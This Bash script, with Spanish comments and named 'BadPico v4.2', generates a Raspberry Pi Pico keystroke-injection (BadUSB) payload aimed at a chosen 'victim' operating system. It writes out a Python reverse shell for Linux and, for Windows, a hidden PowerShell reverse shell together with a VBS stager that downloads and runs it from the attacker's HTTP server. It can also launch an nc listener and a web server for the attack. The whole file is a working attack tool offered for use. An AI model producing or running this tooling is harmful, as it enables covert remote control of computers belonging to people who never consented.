#!/bin/bash

# --- COLORES ---
GN='\e[32m'
YL='\e[33m'
RD='\e[31m'
BL='\e[34m'
NC='\e[0m'

# --- DEPENDENCIAS ---
check_deps() {
    clear
    echo -e "${BL}[*]${NC} Comprobando dependencias..."
    dependencies=(xterm nc python3)
    for dep in "${dependencies[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo -e "${RD}[X]${NC} Falta: $dep. Instala con: sudo apt install xterm netcat -y"
            exit 1
        fi
    done
}

header() {
    clear
    echo -e "${BL}##################################################${NC}"
    echo -e "${BL}#${NC} ${GN}BadPico v4.2 - Invisible Laboratory Edition${NC}  ${BL}#${NC}"
    echo -e "${BL}##################################################${NC}"
}

check_deps

# --- CONFIGURACIÓN DE RED ---
AUTO_IP=$(hostname -I | awk '{print $1}')
TARGET_IP=$AUTO_IP
TARGET_PORT="4444"
HTTP_PORT="8080"

header
echo -e "${YL}[?]${NC} Configuración de red actual:"
echo -e "    IP: ${GN}$TARGET_IP${NC}"
echo -e "    Puerto Listener: ${GN}$TARGET_PORT${NC}"
echo -e "    Puerto HTTP: ${GN}$HTTP_PORT${NC}"
echo ""
read -p "1) Usar defecto | 2) Personalizar > " net_opt

if [ "$net_opt" == "2" ]; then
    read -p "Introduce la IP: " TARGET_IP
    read -p "Introduce el Puerto Netcat: " TARGET_PORT
fi

# --- SELECCIÓN DE S.O. ---
header
echo -e "IP: ${GN}$TARGET_IP${NC} | Port: ${GN}$TARGET_PORT${NC}"
echo -e "--------------------------------------------------"
echo -e "${YL}[1]${NC} Selecciona el Sistema Operativo víctima:"
echo -e "    1) Linux"
echo -e "    2) Windows (Invisible Chain)"
read -p "Opción > " os_opt

# --- SELECCIÓN DE IDIOMA ---
header
if [ "$os_opt" == "1" ]; then
    LAYOUT_IMPORT="from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS"
    LAYOUT_CLASS="KeyboardLayoutUS(kbd)"
    SHORTCUT="Keycode.CONTROL, Keycode.ALT, Keycode.T"
    SLEEP="2.0"
    CMD="python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$TARGET_IP\",$TARGET_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")' & exit"
else
    echo -e "${YL}[2]${NC} Selecciona el idioma del teclado víctima:"
    echo -e "    1) Español (ES)"
    echo -e "    2) Inglés (US)"
    read -p "Opción > " lang_opt

    if [ "$lang_opt" == "1" ]; then
        LAYOUT_IMPORT="from adafruit_hid.keyboard_layout_win_es import KeyboardLayout"
        LAYOUT_CLASS="KeyboardLayout(kbd)"
    else
        LAYOUT_IMPORT="from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS"
        LAYOUT_CLASS="KeyboardLayoutUS(kbd)"
    fi

    SHORTCUT="Keycode.GUI, Keycode.R"
    SLEEP="1.2"

    # 1. Crear p.ps1 (Payload interactivo)
    cat << 'EOF' > p.ps1
$c = New-Object System.Net.Sockets.TCPClient('TARGET_IP', TARGET_PORT);
$s = $c.GetStream();
$b = New-Object Byte[] 65536;
$e = New-Object System.Text.ASCIIEncoding;
$sm = $e.GetBytes("--- Conexion Establecida ---`nPS " + (pwd).Path + "> ");
$s.Write($sm, 0, $sm.Length);
while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = $e.GetString($b, 0, $i);
    try { $out = (iex $d 2>&1 | Out-String); } catch { $out = $_.Exception.Message; }
    $p = $out + "PS " + (pwd).Path + "> ";
    $sm = $e.GetBytes($p);
    $s.Write($sm, 0, $sm.Length);
    $s.Flush();
}
$c.Close();
EOF
    sed -i "s/TARGET_IP/$TARGET_IP/g" p.ps1
    sed -i "s/TARGET_PORT/$TARGET_PORT/g" p.ps1

    # 2. Crear h.vbs (Corregido: Comillas dobles para que WScript no falle)
    cat << EOF > h.vbs
Set objShell = CreateObject("WScript.Shell")
strCmd = "powershell.exe -NoP -Exec Bypass -W Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://$TARGET_IP:$HTTP_PORT/p.ps1')"
objShell.Run strCmd, 0, False
EOF

    # 3. Comando para la Pico (escapando $ y usando comillas simples para la ruta)
    CMD="powershell -W Hidden -p \"\$f=\$env:temp+'\h.vbs';(New-Object Net.WebClient).DownloadFile('http://$TARGET_IP:$HTTP_PORT/h.vbs',\$f);wscript //B \$f\""
fi

# --- GENERACIÓN DEL ARCHIVO code.py ---
cat << EOF > code.py
import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
$LAYOUT_IMPORT

kbd = Keyboard(usb_hid.devices)
layout = $LAYOUT_CLASS

time.sleep(5)
kbd.release_all()

# Abrir Ejecutar o Terminal
kbd.press($SHORTCUT)
time.sleep(0.3)
kbd.release_all()

time.sleep($SLEEP)

# Escribir comando
CMD = r"""$CMD"""
layout.write(CMD)
time.sleep(0.5)
kbd.send(Keycode.ENTER)
EOF

header
echo -e "${GN}[OK]${NC} Archivos generados correctamente."
if [ "$os_opt" == "2" ]; then
    echo -e "    - code.py, p.ps1, h.vbs"
fi

echo ""
read -p "¿Lanzar entorno de ataque automático? (s/n) > " start_atk

if [ "$start_atk" == "s" ]; then
    xterm -hold -T "NC LISTENER $TARGET_PORT" -e "nc -lvnp $TARGET_PORT" &
    if [ "$os_opt" == "2" ]; then
        xterm -hold -T "HTTP SERVER $HTTP_PORT" -e "python3 -m http.server $HTTP_PORT" &
    fi
    echo -e "${GN}[!] Entorno listo. Pasa el code.py a la Pico.${NC}"
else
    echo -e "${YL}[!] Configuración finalizada.${NC}"
fi